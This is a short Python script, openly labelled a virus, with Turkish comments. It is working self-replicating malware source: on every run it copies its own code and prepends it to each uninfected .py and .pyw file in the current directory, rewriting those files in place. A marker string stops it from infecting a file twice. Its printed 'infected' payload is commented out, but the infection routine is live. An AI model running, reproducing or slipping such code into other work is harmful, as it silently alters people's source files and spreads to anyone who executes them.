# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw') # dizindeki tüm py lere erişiyor

for file in python_files:           #py dosyalarındeki orjinal metinleri saklıyor
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:                  # daha önce çalıştıysa bir daha çalışmıyor
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:                  
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED ")

# malicious_code() => :-)
# VIRUS SAYS BYE!
